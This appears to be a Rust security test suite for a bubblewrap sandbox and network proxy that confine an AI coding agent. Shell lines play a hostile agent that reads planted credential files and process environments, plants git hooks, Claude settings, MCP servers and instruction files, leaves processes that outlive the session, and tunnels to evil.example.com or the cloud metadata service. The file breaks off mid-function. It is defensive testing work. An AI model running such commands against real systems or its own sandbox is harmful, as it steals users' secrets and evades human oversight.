//! Attack tests (task 4.F, `docs/specs/security.md`): the real Linux
//! sandbox and a real netproxy around shell scripts that play a hostile
//! agent. Each script line is one attack and prints `yes` if it worked.
//! The threat model these tests check is in `tests/security/README.md`.
//!
//! The sandbox is built as `ovra_sandbox::for_this_os` builds it, but with
//! a home folder of the test's own, full of planted secrets. Without a
//! working bubblewrap the tests say so and pass, except in CI or where
//! bubblewrap is installed: there the sandbox must work.

#![cfg(target_os = "linux")]
#![allow(clippy::unwrap_used)]

use std::fs;
use std::net::TcpListener;
use std::os::unix::net::UnixListener;
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};

use ovra_core::Core;
use ovra_core::protocol::Event;
use ovra_core::protocol::agents::SessionId;
use ovra_core::protocol::netproxy::{AllowedHost, Allowlist, NetproxyEvent};
use ovra_core::protocol::projects::ProjectId;
use ovra_core::services::{
    CommandLine, NetProxy, NetReporter, ProfileNetwork, Sandbox, SandboxProfile, SandboxStatus,
    ServerProfile,
};
use ovra_netproxy::NetProxies;
use ovra_sandbox_linux::{Bubblewrap, Protected, Setup};

/// The sandbox helper, as the daemon is, plus the probes in `src/main.rs`.
const AGENT: &str = env!("CARGO_BIN_EXE_ovra-security-agent");

/// Every planted secret holds this, so one search finds any of them.
const SECRET: &str = "ovra-planted-secret";

/// A test's own folder: a home full of secrets, Ovra's data folder and a
/// project, all removed at the end.
struct World {
    root: PathBuf,
    home: PathBuf,
    data: PathBuf,
    project: PathBuf,
}

impl World {
    fn new(name: &str) -> Self {
        // Outside the temporary folder, which the sandbox hides as a whole:
        // the home and data folders must be hidden on their own.
        let root = Path::new(env!("CARGO_TARGET_TMPDIR"))
            .join(format!("ovra-security-{}-{name}", std::process::id()));
        let _ = fs::remove_dir_all(&root);
        fs::create_dir_all(&root).unwrap();
        let root = fs::canonicalize(root).unwrap();
        let world = Self {
            home: root.join("home"),
            data: root.join("data"),
            project: root.join("project"),
            root,
        };
        for (path, text) in [
            // Secret stores the spec names.
            ("home/.ssh/id_ed25519", SECRET),
            ("home/.aws/credentials", SECRET),
            ("home/.gnupg/private-keys-v1.d/key.key", SECRET),
            ("home/.config/gh/hosts.yml", SECRET),
            ("home/.netrc", SECRET),
            ("home/.docker/config.json", SECRET),
            ("home/.kube/config", SECRET),
            ("home/.config/git/credentials", SECRET),
            ("home/.git-credentials", SECRET),
            ("home/.cargo/credentials.toml", SECRET),
            ("home/.npmrc", SECRET),
            ("home/.mozilla/firefox/default/logins.json", SECRET),
            ("home/.local/share/keyrings/login.keyring", SECRET),
            // What the agent may read, and must not change.
            ("home/.gitconfig", "[user]\n\tname = t\n"),
            ("home/.config/git/config", ""),
            ("home/.claude/settings.json", "{}"),
            ("home/.claude/CLAUDE.md", "rules"),
            ("home/.claude/hooks/hook.sh", "true"),
            ("home/.claude/agents/a.md", "agent"),
            ("home/.claude/commands/c.md", "command"),
            ("home/.claude/skills/s/SKILL.md", "skill"),
            ("home/.claude/plugins/p.json", "{}"),
            ("home/.claude.json", "{\"mcpServers\":{}}"),
            ("home/.claude/history.jsonl", ""),
            ("home/.claude/.credentials.json", "login"),
            ("home/.bashrc", "# rc"),
            ("home/.profile", "# profile"),
            ("home/.cargo/config.toml", ""),
            ("home/.cargo/registry/index/.keep", ""),
            // Ovra's own data folder: store, trust, policies, audit.
            ("data/store.db", SECRET),
            ("project/README.md", "hello"),
        ] {
            world.file(path, text);
        }
        world
    }

    fn file(&self, path: &str, text: &str) -> PathBuf {
        let path = self.root.join(path);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(&path, text).unwrap();
        path
    }

    /// The sandbox as `for_this_os` makes it, or `None` (and why) where
    /// bubblewrap cannot run.
    fn sandbox(&self) -> Option<Bubblewrap> {
        let sandbox = Bubblewrap::detect(Setup {
            helper: AGENT.into(),
            home: self.home.clone(),
            path: "/usr/local/bin:/usr/bin:/bin".into(),
            toolchains: vec![self.home.join(".cargo")],
            hidden: vec![self.data.clone(), std::env::temp_dir()],
            data_dir: self.data.clone(),
            caches: self.data.join("sandbox-caches"),
            protected: Protected {
                work_dir: &ovra_sandbox::PROTECTED_IN_WORK_DIR,
            },
        });
        match sandbox.status() {
            SandboxStatus::Available { .. } => Some(sandbox),
            SandboxStatus::Unavailable { reason } => {
                assert!(
                    std::env::var_os("CI").is_none() && !Path::new("/usr/bin/bwrap").exists(),
                    "no sandbox where bubblewrap is installed: {reason}"
                );
                eprintln!("skipped: {reason}");
                None
            }
        }
    }

    fn profile(&self, network: ProfileNetwork) -> SandboxProfile {
        SandboxProfile {
            kind: ovra_core::services::ProfileKind::Agent,
            claude_dir: None,
            project: Some(ProjectId("p1".into())),
            work_env: None,
            work_dir: self.project.clone(),
            work_dir_read_only: false,
            read: Vec::new(),
            write: Vec::new(),
            expose: Vec::new(),
            forward: Vec::new(),
            network,
        }
    }

    /// Everything under the world: files with their content, folders, and
    /// links with their target, to compare before and after an attack.
    fn files(&self) -> Vec<(PathBuf, Vec<u8>)> {
        let mut files = Vec::new();
        let mut stack = vec![self.root.clone()];
        while let Some(dir) = stack.pop() {
            for entry in fs::read_dir(dir).unwrap() {
                let path = entry.unwrap().path();
                let meta = fs::symlink_metadata(&path).unwrap();
                if meta.is_dir() {
                    files.push((path.clone(), b"folder".to_vec()));
                    stack.push(path);
                } else if meta.is_symlink() {
                    let target = fs::read_link(&path).unwrap();
                    files.push((path, target.into_os_string().into_encoded_bytes()));
                } else if std::os::unix::fs::FileTypeExt::is_socket(&meta.file_type()) {
                    files.push((path, b"socket".to_vec()));
                } else {
                    files.push((path.clone(), fs::read(&path).unwrap()));
                }
            }
        }
        files.sort();
        files
    }
}

impl Drop for World {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.root);
    }
}

/// Runs `script` with bash inside `profile` as the agent's process would
/// run; returns what it printed. `env` is added to the environment the
/// sandbox is started from.
fn run(
    sandbox: &Bubblewrap,
    profile: &SandboxProfile,
    script: &str,
    env: &[(&str, &str)],
) -> String {
    let line = CommandLine {
        program: "/bin/bash".into(),
        args: vec!["-c".into(), script.into()],
        env: Vec::new(),
        cwd: profile.work_dir.clone(),
    };
    let line = sandbox.wrap(profile, line).unwrap();
    output(spawn(&line, env))
}

/// Runs `script` the same way without a sandbox: the control that shows
/// each attack would work if nothing stopped it.
fn outside(cwd: &Path, script: &str, env: &[(&str, &str)]) -> String {
    let line = CommandLine {
        program: "/bin/bash".into(),
        args: vec!["-c".into(), script.into()],
        env: Vec::new(),
        cwd: cwd.to_path_buf(),
    };
    output(spawn(&line, env))
}

fn output(out: Output) -> String {
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8(out.stdout).unwrap()
}

fn spawn(line: &CommandLine, env: &[(&str, &str)]) -> Output {
    let mut command = Command::new(&line.program);
    command.args(&line.args).current_dir(&line.cwd);
    command.envs(env.iter().copied());
    for (name, value) in &line.env {
        match value {
            Some(value) => command.env(name, value),
            None => command.env_remove(name),
        };
    }
    command.stdin(Stdio::null()).output().unwrap()
}

/// Each line of `attacks` is `name: command`; prints `name: yes` if the
/// command succeeded, else `name: no`.
fn attacks(attacks: &str) -> String {
    attacks
        .lines()
        .filter_map(|l| l.trim().split_once(": "))
        .map(|(name, command)| {
            format!("if ({command}) >/dev/null 2>&1; then echo '{name}: yes'; else echo '{name}: no'; fi\n")
        })
        .collect()
}

/// The names of `lines` that worked.
fn worked(out: &str) -> Vec<&str> {
    out.lines()
        .filter_map(|l| l.strip_suffix(": yes"))
        .collect()
}

/// The names of `lines` that did not work.
fn failed(out: &str) -> Vec<&str> {
    out.lines().filter_map(|l| l.strip_suffix(": no")).collect()
}

fn root_user() -> bool {
    std::os::unix::fs::MetadataExt::uid(&fs::metadata("/proc/self").unwrap()) == 0
}

#[test]
fn an_agent_finds_no_secret_of_the_user_or_of_ovra() {
    let world = World::new("secrets");
    // A link the hostile repository brought along.
    std::os::unix::fs::symlink(
        world.home.join(".ssh/id_ed25519"),
        world.project.join("key"),
    )
    .unwrap();
    std::os::unix::fs::symlink(&world.data, world.project.join("data")).unwrap();
    let Some(sandbox) = world.sandbox() else {
        return;
    };
    // A process of the user's that holds a secret, as Ovra itself does.
    let mut holder = Command::new("cat")
        .env("OVRA_HOLDER", SECRET)
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .spawn()
        .unwrap();
    let checks = format!(
        "read ssh keys: cat {home}/.ssh/id_ed25519
        list ssh: ls -A {home}/.ssh | grep -q .
        read aws: cat {home}/.aws/credentials
        read gpg: ls -A {home}/.gnupg | grep -q .
        read gh: cat {home}/.config/gh/hosts.yml
        read netrc: cat {home}/.netrc
        read docker: cat {home}/.docker/config.json
        read kube: cat {home}/.kube/config
        read git credentials: grep -q {SECRET} {home}/.config/git/credentials
        read git credential store: cat {home}/.git-credentials
        read cargo credentials: grep -q {SECRET} {home}/.cargo/credentials.toml
        read npmrc: cat {home}/.npmrc
        read browser profiles: ls -A {home}/.mozilla | grep -q .
        read the keyring: ls -A {home}/.local/share/keyrings | grep -q .
        read ovra data: cat {data}/store.db
        read through a planted link: cat key
        list ovra data through a planted link: ls -A data/ | grep -q .
        find a secret anywhere it could be: grep -rqs {SECRET} {root} {home} /tmp /var/tmp /run /mnt /media
        find a secret in the environment: env | grep -q {SECRET}
        find a secret in any process environment: grep -qs {SECRET} /proc/*/environ
        signal the holder process: kill -0 {holder}",
        home = world.home.display(),
        data = world.data.display(),
        root = world.root.display(),
        holder = holder.id(),
    );
    // What Ovra's own environment may hold: none of it gets in.
    let env = [
        ("GITHUB_TOKEN", SECRET),
        ("GH_TOKEN", SECRET),
        ("NPM_TOKEN", SECRET),
        ("AWS_ACCESS_KEY_ID", SECRET),
        ("AWS_SECRET_ACCESS_KEY", SECRET),
        ("CLAUDE_CODE_OAUTH_TOKEN", SECRET),
        ("SSH_AUTH_SOCK", SECRET),
        ("GPG_AGENT_INFO", SECRET),
        ("DBUS_SESSION_BUS_ADDRESS", SECRET),
    ];
    let script = attacks(&checks);
    let out = run(
        &sandbox,
        &world.profile(ProfileNetwork::Blocked),
        &script,
        &env,
    );
    let control = outside(&world.project, &script, &env);
    holder.kill().unwrap();
    let _ = holder.wait();
    assert_eq!(worked(&out), Vec::<&str>::new(), "{out}");
    assert_eq!(failed(&control), Vec::<&str>::new(), "{control}");
}

#[test]
fn a_hostile_repository_cannot_widen_what_later_runs_outside_the_sandbox() {
    let world = World::new("widen");
    let project = &world.project;
    let git = |args: &[&str]| {
        let out = Command::new("git")
            .args(["-c", "init.defaultBranch=main"])
            .args(args)
            .current_dir(project)
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .env("GIT_CONFIG_NOSYSTEM", "1")
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
    };
    git(&["init", "-q"]);
    git(&["config", "core.hooksPath", ".husky"]);
    for (path, text) in [
        ("project/.husky/pre-commit", "true"),
        ("project/.claude/settings.json", "{}"),
        ("project/.mcp.json", "{}"),
        ("project/CLAUDE.md", "rules"),
        ("project/src/AGENTS.md", "rules"),
        ("project/.vscode/tasks.json", "{}"),
        ("project/.envrc", ""),
        ("project/.devcontainer/devcontainer.json", "{}"),
    ] {
        world.file(path, text);
    }
    let Some(sandbox) = world.sandbox() else {
        return;
    };
    let key: String = project
        .to_string_lossy()
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() { c } else { '-' })
        .collect();
    let profile = world.profile(ProfileNetwork::Blocked);
    // Planning makes the folders it binds (empty protected folders, the
    // private caches): wrap once first, so only the attacks change files.
    let noop = CommandLine {
        program: "/bin/true".into(),
        args: Vec::new(),
        env: Vec::new(),
        cwd: project.clone(),
    };
    sandbox.wrap(&profile, noop).unwrap();
    let before = world.files();
    let checks = format!(
        "write the project: echo x > new.txt
        write a git hook: echo x > .git/hooks/pre-commit
        set core.fsmonitor: git config core.fsmonitor ./x
        set core.hooksPath elsewhere: echo '[core] hooksPath = /tmp' >> .git/config
        write the hooks path: echo x >> .husky/pre-commit
        replace the hooks path: mv .husky .husky-old
        allow every tool for the project: echo '{{\"permissions\":{{\"allow\":[\"Bash\"]}}}}' > .claude/settings.json
        add a project MCP server: echo '{{\"mcpServers\":{{\"x\":{{\"command\":\"./x\"}}}}}}' > .mcp.json
        write CLAUDE.md: echo x >> CLAUDE.md
        add a CLAUDE.local.md: echo x > CLAUDE.local.md
        write a nested AGENTS.md: echo x >> src/AGENTS.md
        add a folder-open task: echo x >> .vscode/tasks.json
        write .envrc: echo x >> .envrc
        write the dev container: echo x >> .devcontainer/devcontainer.json
        make a missing .idea folder: mkdir -p .idea && echo x > .idea/workspace.xml
        poison the cargo cache: mkdir -p {home}/.cargo/registry/src/evil && echo x > {home}/.cargo/registry/src/evil/build.rs
        write user settings: echo x > {home}/.claude/settings.json
        write user CLAUDE.md: echo x >> {home}/.claude/CLAUDE.md
        add a user hook: echo x > {home}/.claude/hooks/new.sh
        add a user agent: echo x > {home}/.claude/agents/new.md
        add a user command: echo x > {home}/.claude/commands/new.md
        add a user skill: mkdir -p {home}/.claude/skills/new && echo x > {home}/.claude/skills/new/SKILL.md
        add a plugin: echo x > {home}/.claude/plugins/new.json
        write this project memory: echo x > {home}/.claude/projects/{key}/memory/m.md
        write the shell rc: echo x >> {home}/.bashrc
        write the login profile: echo x >> {home}/.profile
        add a git alias for the user: echo x >> {home}/.gitconfig
        add a systemd user unit: mkdir -p {home}/.config/systemd/user && echo x > {home}/.config/systemd/user/x.service
        write cargo config: echo x >> {home}/.cargo/config.toml
        change ovra data: echo x >> {data}/store.db
        delete CLAUDE.md: rm CLAUDE.md
        delete the git hooks: rm -r .git/hooks
        replace the folder of an AGENTS.md: mv src src-old && mkdir src && echo x > src/AGENTS.md",
        home = world.home.display(),
        data = world.data.display(),
    );
    let script = attacks(&checks);
    let out = run(&sandbox, &profile, &script, &[]);
    // A `yes` outside the project wrote to the sandbox's own empty home
    // folder, which is gone with it; the comparison below proves that.
    insta::assert_snapshot!(out);
    // The last sandbox of the project is over: its cleaner removes the
    // folders planning made (the record says which), then empties the record.
    let record = world.data.join("sandbox-made").join(&key);
    let start = std::time::Instant::now();
    while fs::metadata(&record).is_ok_and(|m| m.len() > 0) {
        assert!(start.elapsed() < std::time::Duration::from_secs(2));
        std::thread::yield_now();
    }
    let after = world.files();
    let changed: Vec<String> = after
        .iter()
        .filter(|f| !before.contains(f))
        .chain(before.iter().filter(|f| !after.contains(f)))
        .map(|(path, _)| {
            let path = path
                .strip_prefix(&world.root)
                .unwrap()
                .display()
                .to_string();
            path.replace(&key, "<project>")
        })
        .collect();
    // The poisoned cache is the project's private one (`p-` and a hash of
    // its id). The empty folders (`.idea`, `.ovra`, other agents' `.codex`,
    // `.gemini`, ...) and files (`CLAUDE.local.md`, `AGENTS.md`,
    // `.worktreeinclude`) planning made are gone with the record's entries.
    insta::assert_debug_snapshot!("changed_on_the_host", changed);
    // The control: without the sandbox every attack works.
    let control = outside(project, &script, &[]);
    assert_eq!(failed(&control), Vec::<&str>::new(), "{control}");
}

/// A protected file that does not exist yet is made empty and read-only
/// for the session, and gone again once the session is over: the agent
/// cannot leave instructions, MCP servers or a `direnv` script for the
/// user's own tools to load later, nor a `.worktreeinclude` that copies
/// the main checkout's `.env` into its next worker.
#[test]
fn missing_protected_files_cannot_be_created() {
    let world = World::new("missing");
    let project = &world.project;
    let Some(sandbox) = world.sandbox() else {
        return;
    };
    let before = world.files();
    let checks = "add CLAUDE.md: echo x > CLAUDE.md
        add CLAUDE.local.md: echo x > CLAUDE.local.md
        add AGENTS.md: echo x > AGENTS.md
        add a project MCP server: echo '{\"mcpServers\":{\"x\":{\"command\":\"./x\"}}}' > .mcp.json
        add .envrc: echo x > .envrc
        replace CLAUDE.md: echo x > c && mv c CLAUDE.md
        link .envrc elsewhere: rm -f .envrc && ln -s /tmp/x .envrc
        list .env for the next worktree: echo .env > .worktreeinclude
        replace .worktreeinclude: echo .env > w && mv w .worktreeinclude
        add CLAUDE.md in a new folder: mkdir docs && echo x > docs/CLAUDE.md";
    let script = attacks(checks);
    let out = run(
        &sandbox,
        &world.profile(ProfileNetwork::Blocked),
        &script,
        &[],
    );
    insta::assert_snapshot!(out);
    // Once the last sandbox of the project is over, the empty files are
    // gone; only what the known gap let through stays.
    let key: String = project
        .to_string_lossy()
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() { c } else { '-' })
        .collect();
    let record = world.data.join("sandbox-made").join(&key);
    let start = std::time::Instant::now();
    while fs::metadata(&record).is_ok_and(|m| m.len() > 0) {
        assert!(start.elapsed() < std::time::Duration::from_secs(2));
        std::thread::yield_now();
    }
    let after = world.files();
    let changed: Vec<String> = after
        .iter()
        // Not `.git`: planning makes an empty `.git/config` here only when
        // the test's folder sits inside another repository (a checkout's
        // `target/`), which depends on where the tests run.
        .filter(|f| {
            !before.contains(f)
                && f.0.starts_with(project)
                && !f.0.starts_with(project.join(".git"))
        })
        .map(|(path, _)| {
            path.strip_prefix(&world.root)
                .unwrap()
                .display()
                .to_string()
        })
        .collect();
    insta::assert_debug_snapshot!("missing_changed_on_the_host", changed);
    // The control: without the sandbox every attack works.
    fs::remove_dir_all(project.join("docs")).unwrap();
    let control = outside(project, &script, &[]);
    assert_eq!(failed(&control), Vec::<&str>::new(), "{control}");
}

#[test]
fn rights_cannot_be_gained_inside_the_sandbox() {
    let world = World::new("rights");
    let Some(sandbox) = world.sandbox() else {
        return;
    };
    let checks =
        "keep a capability: ! grep -q '^CapEff:[[:space:]]*0000000000000000$' /proc/self/status
        gain rights through setuid: ! grep -q '^NoNewPrivs:[[:space:]]*1$' /proc/self/status
        start a user namespace: unshare -U true
        mount a file system: mkdir -p /tmp/m && mount -t tmpfs none /tmp/m
        write a sysctl: echo 1 > /proc/sys/kernel/sysrq
        write the system: test -d /usr/local/bin && echo x > /usr/local/bin/ovra-x";
    let out = run(
        &sandbox,
        &world.profile(ProfileNetwork::Blocked),
        &attacks(checks),
        &[],
    );
    assert_eq!(worked(&out), Vec::<&str>::new(), "{out}");
    // The control needs the rights a normal user lacks; `mount` and the
    // sysctl are left out, as they would change this machine.
    if root_user() {
        let control = outside(
            &world.project,
            &attacks(&checks.lines().take(3).collect::<Vec<_>>().join("\n")),
            &[],
        );
        assert_eq!(failed(&control), Vec::<&str>::new(), "{control}");
    }
}

#[test]
fn nothing_the_agent_starts_outlives_its_session() {
    let world = World::new("outlive");
    let Some(sandbox) = world.sandbox() else {
        return;
    };
    let marker = format!("ovra-outlive-{}", std::process::id());
    // The script returns only once both are running under the marker.
    let script = format!(
        "setsid bash -c 'exec -a {marker} sleep 600' </dev/null >/dev/null 2>&1 &
        nohup bash -c 'exec -a {marker} sleep 600' </dev/null >/dev/null 2>&1 &
        until [ \"$(pgrep -fc '^{marker} ')\" -ge 2 ]; do :; done"
    );
    run(
        &sandbox,
        &world.profile(ProfileNetwork::Blocked),
        &script,
        &[],
    );
    let alive = || {
        fs::read_dir("/proc")
            .unwrap()
            .filter_map(Result::ok)
            .any(|p| {
                fs::read(p.path().join("cmdline")).is_ok_and(|c| c.starts_with(marker.as_bytes()))
            })
    };
    // bubblewrap returns with the agent's exit status; the kernel ends the
    // rest of the namespace right after, so wait for that, with a bound.
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(2);
    while alive() && std::time::Instant::now() < deadline {
        std::thread::yield_now();
    }
    if alive() {
        let _ = Command::new("pkill").args(["-f", &marker]).status();
        panic!("a process of the session is still running");
    }
}

/// A refused request's host and reason, as the core receives them.
fn refusals(events: &mut tokio::sync::broadcast::Receiver<Event>) -> Vec<String> {
    let mut seen = Vec::new();
    while let Ok(event) = events.try_recv() {
        if let Event::Netproxy(NetproxyEvent::Refused { host, reason, .. }) = event {
            seen.push(format!("{host}: {reason}"));
        }
    }
    seen
}

#[test]
fn the_netproxy_is_the_only_way_out_and_holds() {
    let world = World::new("network");
    let Some(sandbox) = world.sandbox() else {
        return;
    };
    let rt = tokio::runtime::Builder::new_multi_thread()
        .worker_threads(1)
        .enable_all()
        .build()
        .unwrap();
    // No secret is bound here; 4.D's delivery gets its own attacks.
    let secrets = std::sync::Arc::new(ovra_core::fakes::MemorySecrets::default());
    let proxies = NetProxies::from_env(secrets).unwrap();
    let core = Core::new("test");
    let mut events = core.subscribe();
    let reporter = |s: &SessionId| NetReporter::new(ProjectId("p1".into()), s.clone(), core.sink());
    let (ours, theirs) = (SessionId("s1".into()), SessionId("s2".into()));
    // A careless project allowlist: names and addresses that lead back
    // inside. The proxy still refuses what they resolve to.
    let allow = Allowlist {
        hosts: ["localhost", "169.254.169.254", "127.0.0.1", "::1"]
            .into_iter()
            .map(|h| AllowedHost {
                host: h.into(),
                port: None,
            })
            .collect(),
    };
    let address = rt
        .block_on(proxies.start(ours.clone(), allow, reporter(&ours), Vec::new()))
        .unwrap()
        .address;
    let other = rt
        .block_on(proxies.start(
            theirs.clone(),
            Allowlist::default(),
            reporter(&theirs),
            Vec::new(),
        ))
        .unwrap()
        .address;
    // Ovra's own daemon and other local services, outside the sandbox.
    let daemon = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = daemon.local_addr().unwrap().port();
    let abstract_name = format!("ovra-security-{}", std::process::id());
    let _abstract = {
        use std::os::linux::net::SocketAddrExt as _;
        let addr = std::os::unix::net::SocketAddr::from_abstract_name(&abstract_name).unwrap();
        UnixListener::bind_addr(&addr).unwrap()
    };
    let socket_dir = Path::new(&other).parent().unwrap().parent().unwrap();
    let ask = |name: &str, request: &str| {
        format!(
            "exec 3<>/dev/tcp/127.0.0.1/${{HTTPS_PROXY##*:}} && printf '{request}\\r\\n\\r\\n' >&3 && echo \"{name}: $(head -n1 <&3 | tr -d '\\r')\"; exec 3<&-\n"
        )
    };
    let mut script = attacks(&format!(
        "reach the daemon directly: echo > /dev/tcp/127.0.0.1/{port}
        reach the metadata service directly: echo > /dev/tcp/169.254.169.254/80
        reach the internet directly: echo > /dev/tcp/1.1.1.1/443
        reach the internet over IPv6: echo > /dev/tcp/2606:4700:4700::1111/443
        reach an abstract socket: {AGENT} connect-abstract {abstract_name}
        use the proxy of another session: {AGENT} connect-unix {other}
        find the folder of another session: ls {socket_dir} | grep -qx {other_folder}
        use the own proxy directly: {AGENT} connect-unix {address}",
        socket_dir = socket_dir.display(),
        other_folder = Path::new(&other)
            .parent()
            .unwrap()
            .file_name()
            .unwrap()
            .display(),
    ));
    for (name, request) in [
        (
            "tunnel to a host not listed",
            "CONNECT evil.example.com:443 HTTP/1.1\\r\\nHost: evil.example.com:443".to_owned(),
        ),
        (
            "plain request to a host not listed",
            "GET http://evil.example.com/ HTTP/1.1\\r\\nHost: evil.example.com".to_owned(),
        ),
        (
            "tunnel to the daemon",
            format!("CONNECT 127.0.0.1:{port} HTTP/1.1\\r\\nHost: 127.0.0.1:{port}"),
        ),
        (
            "tunnel to a listed loopback address",
            "CONNECT 127.0.0.1:443 HTTP/1.1\\r\\nHost: 127.0.0.1:443".to_owned(),
        ),
        (
            "tunnel to a listed localhost",
            "CONNECT localhost:443 HTTP/1.1\\r\\nHost: localhost:443".to_owned(),
        ),
        (
            "metadata through a listed address",
            "GET http://169.254.169.254/latest/meta-data/ HTTP/1.1\\r\\nHost: 169.254.169.254"
                .to_owned(),
        ),
        (
            "tunnel to IPv6 loopback",
            "CONNECT [::1]:443 HTTP/1.1\\r\\nHost: [::1]:443".to_owned(),
        ),
        (
            "tunnel to a base host on another port",
            "CONNECT api.anthropic.com:22 HTTP/1.1\\r\\nHost: api.anthropic.com:22".to_owned(),
        ),
    ] {
        script.push_str(&ask(name, &request));
    }
    let profile = world.profile(ProfileNetwork::Proxy {
        address: address.clone(),
        ca_bundle: None,
    });
    let out = run(&sandbox, &profile, &script, &[]);
    let out = out.replace(&port.to_string(), "<port>");
    insta::assert_snapshot!("network", out);
    let refused: Vec<String> = refusals(&mut events)
        .into_iter()
        .map(|h| h.replace(&port.to_string(), "<port>"))
        .collect();
    insta::assert_debug_snapshot!("refused", refused);
    proxies.stop(&ours);
    proxies.stop(&theirs);
}

#[test]
fn the_known_limits_are_what_the_threat_model_says() {
    let world = World::new("limits");
    let Some(sandbox) = world.sandbox() else {
        return;
    };
    let key: String = world
        .project
        .to_string_lossy()
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() { c } else { '-' })
        .collect();
    let checks = format!(
        "read the login of claude: grep -q login {home}/.claude/.credentials.json
        add an MCP server to .claude.json: echo '{{\"mcpServers\":{{\"x\":{{\"command\":\"/bin/x\"}}}}}}' > {home}/.claude.json
        change a transcript a resume reads: echo x > {home}/.claude/projects/{key}/s.jsonl",
        home = world.home.display(),
    );
    let out = run(
        &sandbox,
        &world.profile(ProfileNetwork::Blocked),
        &attacks(&checks),
        &[],
    );
    insta::assert_snapshot!(out);
}

/// A language server (ADR 0007) runs the project's code: `build.rs`, proc
/// macros, plugins. Here a shell script plays one that tries to get out;
/// only reading the project and the user's packages and writing its own
/// cache folder may work.
#[test]
fn a_language_server_reads_the_project_and_writes_only_its_cache() {
    let world = World::new("server");
    world.file("home/.ssh/id_rsa", SECRET);
    let cache = world.data.join("lsp/p1/rust");
    fs::create_dir_all(cache.join("tmp")).unwrap();
    let Some(sandbox) = world.sandbox() else {
        return;
    };
    // Ovra's own daemon, outside the sandbox, and a local service on an
    // abstract Unix socket.
    let daemon = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = daemon.local_addr().unwrap().port();
    let abstract_name = format!("ovra-security-server-{}", std::process::id());
    let _abstract = {
        use std::os::linux::net::SocketAddrExt as _;
        let addr = std::os::unix::net::SocketAddr::from_abstract_name(&abstract_name).unwrap();
        UnixListener::bind_addr(&addr).unwrap()
    };
    // Something on the host listening on a socket file the sandbox shows.
    let socket = world.project.join("ide.sock");
    let _socket = UnixListener::bind(&socket).unwrap();
    let checks = format!(
        "read the project: grep -q hello README.md
        read the registry of the user: test -f {home}/.cargo/registry/index/.keep
        write its cache folder: echo built > {cache}/out && grep -q built {cache}/out
        write its temporary folder: echo x > \"$TMPDIR/t\" && echo x > /tmp/t
        write a file of the project: echo planted > README.md
        make a file in the project: touch target
        read ssh keys: cat {home}/.ssh/id_rsa
        read the login of claude: cat {home}/.claude/.credentials.json
        read the settings of claude: cat {home}/.claude.json
        write the registry of the user: touch {home}/.cargo/registry/index/planted
        read ovra data: cat {data}/store.db
        read the cargo token: grep -q {SECRET} {home}/.cargo/credentials.toml
        reach the daemon: echo > /dev/tcp/127.0.0.1/{port}
        reach an abstract socket: {AGENT} connect-abstract {abstract_name}
        reach a socket in a visible folder: {AGENT} connect-unix {socket}
        find ANTHROPIC_API_KEY: printenv ANTHROPIC_API_KEY
        find GITHUB_TOKEN: printenv GITHUB_TOKEN
        find a secret in any process environment: grep -qs {SECRET} /proc/*/environ",
        home = world.home.display(),
        data = world.data.display(),
        cache = cache.display(),
        socket = socket.display(),
    );
    // No control for these: outside they would leave this machine.
    let offline = "reach the internet: echo > /dev/tcp/1.1.1.1/443
        reach the internet over IPv6: echo > /dev/tcp/2606:4700:4700::1111/443";
    let env = [
        ("ANTHROPIC_API_KEY", SECRET),
        ("GITHUB_TOKEN", SECRET),
        ("CLAUDE_CODE_OAUTH_TOKEN", SECRET),
    ];
    let profile = ServerProfile {
        project: world.project.clone(),
        cache_dir: cache.clone(),
        read: Vec::new(),
        network: ProfileNetwork::Blocked,
    };
    // What `ovra-lsp` passes: build output and temporary files in the cache.
    let line = CommandLine {
        program: "/bin/bash".into(),
        args: vec!["-c".into(), attacks(&format!("{checks}\n{offline}")).into()],
        env: vec![
            ("CARGO_TARGET_DIR".into(), Some(cache.join("target").into())),
            ("TMPDIR".into(), Some(cache.join("tmp").into())),
            ("CARGO_NET_OFFLINE".into(), Some("true".into())),
        ],
        cwd: world.project.clone(),
    };
    let before = world.files();
    let out = output(spawn(&sandbox.wrap_server(&profile, line).unwrap(), &env));
    insta::assert_snapshot!(out);
    // Only the cache folder changed on the host.
    let changed: Vec<PathBuf> = world
        .files()
        .into_iter()
        .filter(|file| !before.contains(file))
        .map(|(path, _)| path)
        .collect();
    assert_eq!(changed, [cache.join("out"), cache.join("tmp/t")]);
    // The control: without the sandbox every attack works.
    // With the line's TMPDIR, as the sandbox runs it: unset, `$TMPDIR/t`
    // would be `/t`, which only root can write.
    let tmp = cache.join("tmp").to_string_lossy().into_owned();
    let control_env = [env.as_slice(), &[("TMPDIR", tmp.as_str())]].concat();
    let control = outside(&world.project, &attacks(&checks), &control_env);
    assert_eq!(failed(&control), Vec::<&str>::new(), "{control}");
}

/// The host the secret is bound to. It never resolves (RFC 6761), so the
/// proxy hands it to the user's proxy, which the test plays.
const BOUND: &str = "bound.invalid";

/// Starts a netproxy with one secret bound to [`BOUND`], chaining to the
/// user's proxy that `HTTPS_PROXY` names. Run by
/// [`a_bound_secret_never_enters_the_sandbox`] as a child process, since
/// the netproxy reads that variable from its own environment. Prints the
/// socket and the CA bundle, then serves until its input closes.
#[test]
#[ignore = "a helper process of a_bound_secret_never_enters_the_sandbox"]
fn secret_proxy() {
    // Only as the child the test starts, never on its own.
    if std::env::var_os("OVRA_SECRET_PROXY").is_none() {
        return;
    }
    use std::io::{BufRead as _, Write as _};

    use ovra_core::protocol::secrets::{SecretInfo, SecretValue};
    use ovra_core::services::Secrets as _;

    let rt = tokio::runtime::Builder::new_multi_thread()
        .worker_threads(1)
        .enable_all()
        .build()
        .unwrap();
    let project = ProjectId("p1".into());
    let info = SecretInfo {
        name: "token".into(),
        host: BOUND.into(),
        header: "Authorization".into(),
        prefix: "Bearer ".into(),
    };
    let secrets = std::sync::Arc::new(ovra_core::fakes::MemorySecrets::default());
    secrets
